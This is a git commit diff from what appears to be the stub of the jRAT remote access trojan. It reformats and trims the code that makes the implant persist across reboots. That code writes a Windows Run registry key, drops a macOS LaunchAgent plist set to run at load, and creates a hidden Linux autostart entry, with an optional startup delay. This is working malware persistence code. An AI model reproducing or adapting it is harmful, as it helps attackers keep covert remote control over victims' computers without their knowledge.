bbb28f9e972ebd5f624dd12bedfba38f5e46dd54
redpois0n <red@cmail.nu>
2015-03-17 15:41:09 +0100

    Commented out things that made my eclipse crash

--- Stub/src/se/jrat/stub/Startup.java
+++ Stub/src/se/jrat/stub/Startup.java
@@ -6,98 +6,95 @@ import java.io.PrintWriter;
 
 import se.jrat.stub.utils.Utils;
 
-import com.redpois0n.oslib.DesktopEnvironment;
-import com.redpois0n.oslib.DesktopEnvironment.Family;
 import com.redpois0n.oslib.OperatingSystem;
 import com.redpois0n.oslib.windows.WindowsOperatingSystem;
 import com.redpois0n.oslib.windows.WindowsVersion;
 
-
 public class Startup {
 
-	public static final void addToStartup(String name) throws Exception {
-		File currentJar = Utils.getJarFile();
+    public static final void addToStartup(String name) throws Exception {
+        File currentJar = Utils.getJarFile();
 
-		String home = System.getProperty("user.home");
+        String home = System.getProperty("user.home");
 
-		if (Utils.isRoot() && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
-			home = "/System/";
-		}
-		if (currentJar.isFile() || currentJar.getName().endsWith(".jar")) {
-			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
-				String javaHome = System.getProperty("java.home") + "\\bin\\javaw.exe";
+        if (Utils.isRoot() && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
+            home = "/System/";
+        }
+        if (currentJar.isFile() || currentJar.getName().endsWith(".jar")) {
+            if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
+                String javaHome = System.getProperty("java.home") + "\\bin\\javaw.exe";
 
-				if (((WindowsOperatingSystem) OperatingSystem.getOperatingSystem()).getVersion() == WindowsVersion.WINXP) {			
-					String data = javaHome + " -jar \"" + currentJar.getAbsolutePath().replace("%20", " ") + "\"";
-					String cmd = "REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v \"" + name + "\" /t REG_SZ /d \"" + data + "\" /f";
-					Runtime.getRuntime().exec(cmd);
-				} else {
-					try {
-						WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name);
-					} catch (Exception ex) {
-						ex.printStackTrace();
-					}
-					WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, "\"" + javaHome + "\" -jar \"" + currentJar.getAbsolutePath() + "\"");
-				
-				}
-			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
-				File startupFile = new File(home + "/Library/LaunchAgents/" + Configuration.name + ".plist");
+                if (((WindowsOperatingSystem) OperatingSystem.getOperatingSystem()).getVersion() == WindowsVersion.WINXP) {            
+                    String data = javaHome + " -jar \"" + currentJar.getAbsolutePath().replace("%20", " ") + "\"";
+                    String cmd = "REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v \"" + name + "\" /t REG_SZ /d \"" + data + "\" /f";
+                    Runtime.getRuntime().exec(cmd);
+                } else {
+                    try {
+                        WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name);
+                    } catch (Exception ex) {
+                        ex.printStackTrace();
+                    }
+                    WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, "\"" + javaHome + "\" -jar \"" + currentJar.getAbsolutePath() + "\"");
+                
+                }
+            } else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
+                File startupFile = new File(home + "/Library/LaunchAgents/" + Configuration.name + ".plist");
 
-				if (!startupFile.getParentFile().exists()) {
-					startupFile.getParentFile().mkdirs();
-				}
+                if (!startupFile.getParentFile().exists()) {
+                    startupFile.getParentFile().mkdirs();
+                }
 
-				PrintWriter out = new PrintWriter(new FileWriter(startupFile));
-				out.println("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
-				out.println("<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">");
-				out.println("<plist version=\"1.0\">");
-				out.println("<dict>");
-				out.println("   <key>Label</key>");
-				out.println("   <string>" + currentJar.getAbsolutePath().replace("file:", "").replace(".jar", "") + "</string>");
-				out.println("   <key>ProgramArguments</key>");
-				out.println("   <array>");
-				out.println("      <string>" + System.getProperty("java.home").replace(" ", "%20") + System.getProperty("file.separator") + "bin" + System.getProperty("file.separator") + "java</string>");
-				out.println("      <string>-jar</string>");
-				out.println("      <string>" + currentJar.getAbsolutePath().replace("file:", "") + "</string>");
-				out.println("   </array>");
-				out.println("   <key>RunAtLoad</key>");
-				out.println("   <true/>");
-				out.println("</dict>");
-				out.println("</plist>");
-				out.close();
-			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.LINUX || OperatingSystem.getOperatingSystem().getType() == OperatingSystem.BSD || OperatingSystem.getOperatingSystem().getType() == OperatingSystem.SOLARIS) {
-				File autostart = new File(home + "/.config/autostart/");
+                PrintWriter out = new PrintWriter(new FileWriter(startupFile));
+                out.println("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
+                out.println("<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">");
+                out.println("<plist version=\"1.0\">");
+                out.println("<dict>");
+                out.println("   <key>Label</key>");
+                out.println("   <string>" + currentJar.getAbsolutePath().replace("file:", "").replace(".jar", "") + "</string>");
+                out.println("   <key>ProgramArguments</key>");
+                out.println("   <array>");
+                out.println("      <string>" + System.getProperty("java.home").replace(" ", "%20") + System.getProperty("file.separator") + "bin" + System.getProperty("file.separator") + "java</string>");
+                out.println("      <string>-jar</string>");
+                out.println("      <string>" + currentJar.getAbsolutePath().replace("file:", "") + "</string>");
+                out.println("   </array>");
+                out.println("   <key>RunAtLoad</key>");
+                out.println("   <true/>");
+                out.println("</dict>");
+                out.println("</plist>");
+                out.close();
+            } else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.LINUX || OperatingSystem.getOperatingSystem().getType() == OperatingSystem.BSD || OperatingSystem.getOperatingSystem().getType() == OperatingSystem.SOLARIS) {
+                File autostart = new File(home + "/.config/autostart/");
 
-				if (!autostart.exists()) {
-					autostart.mkdirs();
-				}
+                if (!autostart.exists()) {
+                    autostart.mkdirs();
+                }
 
-				File startupFile = new File(home + "/.config/autostart/" + Configuration.name + ".desktop");
+                File startupFile = new File(home + "/.config/autostart/" + Configuration.name + ".desktop");
 
-				PrintWriter out = new PrintWriter(new FileWriter(startupFile));
-				out.println("[Desktop Entry]");
-				out.println("Type=Application");
-				out.println("Name=" + Configuration.name);
-				out.println("Exec=java -jar '" + currentJar.getAbsolutePath() + "'");
-				out.println("Terminal=false");
-				out.println("NoDisplay=true");
-				
-				try {
-					boolean correctenv = DesktopEnvironment.getFromCurrentDesktopString().getFamily() == Family.GNOME || DesktopEnvironment.getFromCurrentDesktopString().getFamily() == Family.UNITY;
-					if (Configuration.getConfig().get("delay").equalsIgnoreCase("true") && correctenv) {
-						int ms = Integer.parseInt(Configuration.getConfig().get("delayms"));
-						out.println("X-GNOME-Autostart-Delay=" + ms);
-					}
-				} catch (Exception e) {
-					e.printStackTrace();
-				}
+                PrintWriter out = new PrintWriter(new FileWriter(startupFile));
+                out.println("[Desktop Entry]");
+                out.println("Type=Application");
+                out.println("Name=" + Configuration.name);
+                out.println("Exec=java -jar '" + currentJar.getAbsolutePath() + "'");
+                out.println("Terminal=false");
+                out.println("NoDisplay=true");
+                
+               /* try {
+                    boolean correctenv = DesktopEnvironment.getFromCurrentDesktopString().getFamily() == Family.GNOME || DesktopEnvironment.getFromCurrentDesktopString().getFamily() == Family.UNITY;
+                    if (Configuration.getConfig().get("delay").equalsIgnoreCase("true") && correctenv) {
+                        int ms = Integer.parseInt(Configuration.getConfig().get("delayms"));
+                        out.println("X-GNOME-Autostart-Delay=" + ms);
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }*/
 
-				out.close();
+                out.close();
 
-				String[] cmd = new String[] { "chmod", "+x", startupFile.getAbsolutePath() };
-				Runtime.getRuntime().exec(cmd);
-			}
-		}
-	}
+                String[] cmd = new String[] { "chmod", "+x", startupFile.getAbsolutePath() };
+                Runtime.getRuntime().exec(cmd);
+            }
+        }
+    }
 
 }
--- Stub/src/se/jrat/stub/modules/startup/SleepStartupModule.java
+++ Stub/src/se/jrat/stub/modules/startup/SleepStartupModule.java
@@ -4,25 +4,18 @@ import java.util.Map;
 
 import se.jrat.stub.Configuration;
 
-import com.redpois0n.oslib.DesktopEnvironment;
-import com.redpois0n.oslib.DesktopEnvironment.Family;
-
 public class SleepStartupModule extends StartupModule {
 
 	public SleepStartupModule(Map<String, String> config) {
 		super(config);
 	}
 
+	@Override
 	public void run() throws Exception {
-		try {
-			boolean correctenv = DesktopEnvironment.getFromCurrentDesktopString().getFamily() == Family.GNOME || DesktopEnvironment.getFromCurrentDesktopString().getFamily() == Family.UNITY;
+        if (Boolean.parseBoolean(Configuration.getConfig().get("delay"))) {
+            Thread.sleep(Long.parseLong(Configuration.getConfig().get("delayms")));                
+        }            
 
-			if (Boolean.parseBoolean(Configuration.getConfig().get("delay")) && !correctenv) {
-				Thread.sleep(Long.parseLong(Configuration.getConfig().get("delayms")));				
-			}			
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
 	}
 
 }
